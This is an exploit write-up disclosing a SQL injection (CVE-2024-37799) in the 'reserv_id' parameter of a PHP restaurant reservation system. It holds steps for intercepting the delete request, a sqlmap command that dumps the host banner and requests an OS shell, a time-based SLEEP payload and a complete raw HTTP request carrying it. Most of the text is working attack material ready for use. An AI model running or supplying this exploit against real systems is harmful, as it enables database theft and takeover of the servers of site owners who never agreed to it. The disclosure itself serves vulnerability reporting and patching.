# Exploit Title: Restaurant Reservation System v1.0 - SQL Injection
# Date: 2024-06-05
# Exploit Author: Himanshu Bindra
# Vendor Homepage: https://code-projects.org/restaurant-reservation-system-in-php-with-source-code/
# Software Link: https://download-media.code-projects.org/2020/09/Restaurant_Reservation_System_In_PHP_With_Source_Code.zip
# Version: 1.0
# Tested on: Windows 11, PHP 8.2.12, Apache 2.4.58
# CVE: CVE-2024-37799

#Description: Restaurant Reservation System v1.0 allows remote attackers to inject malicious queries which could be used to execute arbitrary SQL commands via the 'reserv_id' parameter.

#POC:
1) Go to the View Reservations page
2) Delete the existing entry and intercept the request.
3) Use the Sqlmap to perform the SQL injection on the target parameter "reserv_id"

In sqlmap use the 'reserv_id' parameter to dump the hostname and banner. Then run SQLmap to extract the data from the database:
sqlmap -u "http://--Redacted--/restaurant/includes/delete.php" --data="reserv_id=77*^&delete-submit=" --hostname -b --os-shell --cookie="PHPSESSID=podmt61i--Redacted--"

#Example payload:

reserv_id=77 AND (SELECT 9145 FROM (SELECT(SLEEP(5)))AVPJ)

#HTTP Request:

POST /restaurant/includes/delete.php HTTP/1.1
Host: --Redacted--
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: --Redacted--
Connection: close
Referer: http://--Redacted--/restaurant/view_reservations.php
Cookie: PHPSESSID=podmt61--Redacted--
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1

reserv_id=77+AND+(SELECT+9145+FROM+(SELECT(SLEEP(25)))AVPJ)&delete-submit=
